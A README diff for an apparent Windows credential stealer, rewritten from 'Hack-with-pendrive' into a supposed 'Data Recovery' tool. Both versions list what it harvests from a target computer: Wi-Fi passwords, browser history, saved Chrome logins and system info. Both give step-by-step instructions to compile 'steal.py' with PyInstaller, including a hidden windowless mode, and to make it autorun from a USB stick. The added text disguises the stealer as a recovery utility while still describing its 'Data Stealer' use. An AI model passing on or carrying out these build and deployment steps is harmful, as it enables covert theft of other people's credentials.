@@ -1,81 +1,82 @@
-# THIS `README.md` FILE IS OUTDATED, IT WILL BE UPDATED SOON!
+# Data Recovery
 
-# Hack-with-pendrive 
-just plug in your pen and BOOM!
+This application is designed to help users recover lost or forgotten data such as Wi-Fi passwords, browser data, browser passwords, and other sensitive information from their computers.
 
-# Demonstation 
-I plugged in the pendrive, and this is what it does.
+With this application, users can easily recover lost or forgotten Wi-Fi passwords and other login credentials, as well as browsing history, bookmarks, and other web data. This makes it easy to recover data quickly.
 
-https://user-images.githubusercontent.com/36286877/127731137-c9c871cc-6e6d-4f95-9540-d7fd4332d683.mp4
+The data recovery process is secure, as the application does not store or share any sensitive data. Additionally, the application is highly efficient, with fast scanning and recovery times, enabling users to recover their lost data quickly and easily.
 
-# Added Lately
-I added three new features ( two are disabled by default, in the connfig file )
-  1. IP Config data ( "ipconfig /all" )
-  2. System Info - Disabled by default
-  2. Fake BSOD - Disabled by default
+# How to Setup?
 
-# All Features
-You plug in the pendrive, all the needed information will be retrieved from the target computer! Everything that this software collects is mentioned below!
-  1. All Wi-Fi Passwords of connected networks
-  2. Web Browser Histroy ( of almost all browsers )
-  3. Login Passwords Saved in Chrome ( the default and the first 10 profiles )
-  4. IP Config Information ( "ipconfig /all" )
-  5. System Info - Disabled by default ( "systeminfo" )
-  6. Fake BSOD - Disabled by default
+1. Install Python
+2. Run this command to use a Virtual Enviroment (This will help in a reduced compiled file size)
 
+    ```
+    python -m pip install virtualenv
+    ```
 
-# Editing the `config.json`
+3. Create a virtual enviroment
 
-![image](https://user-images.githubusercontent.com/36286877/127732910-fae06dea-f5eb-4854-915f-28c08022b776.png)
-![image](https://user-images.githubusercontent.com/36286877/127732918-dc3f9e70-3792-4a59-b80a-974704725898.png)
+    ```
+    virtualenv env
+    ```
 
-( "yes" for true and "no" for false ) - These are the main useful things in this file :)
+4. Activate the virtual enviroment
 
-# How to compile ( from `.py` to `.exe` )
-Run these commands to make it working
-```
-pip install win32crypt
-pip install pypiwin32
-pip install pycryptodome
+    ```
+    env\Scripts\activate.bat
+    ```
 
-pip install browser-history
-# or
-pip install browser-history
-```
-or Run this command
-```
-python install.py
-```
-and finally,
+5. Install requirements
 
+    ```
+    pip install -r requirements.txt
+    ```
 
-Run this command to make a `.exe` our of the `runall.py` file
-```
-pyinstaller --noconfirm --onefile --console --icon "logo.ico" "runall.py"
-```
+6. Install PyInstaller to build the executable
 
-# Make the file autorun
-For this, you need a third party software: 
-  1. Link 1 - https://www.samlogic.net/usb-autorun-creator/usb-autorun-creator.htm
-  2. Link 2 - https://download.cnet.com/SamLogic-USB-AutoRun-Creator/3000-2094_4-75724123.html
-  3. Link 3 - https://www.softpedia.com/get/System/System-Miscellaneous/USB-AutoRun-Creator.shtml
+    ```
+    pip install pyinstaller
+    ```
+
+7. Run these commands to compile
+    - Normal Mode
+
+      ```
+      pyinstaller steal.py --noconfirm --onefile --name 'Data Recovery' --console 
+      ```
+
+    - Hidden Mode
+
+      ```
+      pyinstaller steal.py --noconfirm --onefile --name 'Data Recovery' --windowed 
+      ```
+
+8. Deactive the virtual enviroment
+
+    ```
+    deactivate
+    ```
+
+Your compiled `Data Recovery.exe` is available at `./dist`
+
+# Use Cases
+
+- ## Data Recovery
+  - You can easily recover data that has been lost using this tool
   
-Visit one of the above links and download the SamLogic USB AutoRun Creator and install it!
+  - This is what this tool is made for
+  
+  - I do not encourage this to be used in occasion except for Data Recovery Purposes
+
+- ## Data Stealer
+  - I do not encourage anyone to use this tool for this malicious purpose and I am not responsible for anything done with this
+  - This can be compiled with PyInstaller using the `--windowed` argument to not show any window while this is running
+
+  - This can autorun on computers upto windows 10 if configured properly using tools like [SamLogic UBS AutoRun Creator](https://www.samlogic.net/usb-autorun-creator/usb-autorun-creator.htm)
+    
+    - It can be downloaded here: [link 1](https://www.samlogic.net/usb-autorun-creator/usb-autorun-creator.htm) / [link 2](https://download.cnet.com/SamLogic-USB-AutoRun-Creator/3000-2094_4-75724123.html) / [link 3](https://www.softpedia.com/get/System/System-Miscellaneous/USB-AutoRun-Creator.shtml)
+    
+    - Select the file .exe file inside the `dist` folder ( after compiling with pyinstaller ), select the pendrive and Click on the USB device you have plugged in, Enter any name as the Label and finally click `Create`. Wait some time for the software to generate and copy the necessary files.
 
 ![image](https://user-images.githubusercontent.com/36286877/127734445-f196d1a0-3d30-4788-a14e-9a38bd061272.png)
-
-Select the file .exe file inside the `dist` folder ( after compiling with pyinstaller ), select the pendrive and Click on the USB device you have plugged in, Enter any name as the Label and finally click `Create`. Wait some time for the software to generate and copy the necessary files.
-
-## Finally
-Please make sure to copy these two files to the pendrive after completing the above step
-
-![image](https://user-images.githubusercontent.com/36286877/127734734-49538c82-b357-4cf8-8e56-4fe4027d3e04.png)
-
-
-`config.json` should also be copied, but if this isn't done, the program will generate the file automatically ( default settings ) and will work perfectly fine!
-
-# YOU ARE DONE!
-
-![hackingpendrive](https://user-images.githubusercontent.com/36286877/127767173-b22f217f-8bf9-471a-a99f-ce65b923f66f.png)
-
-
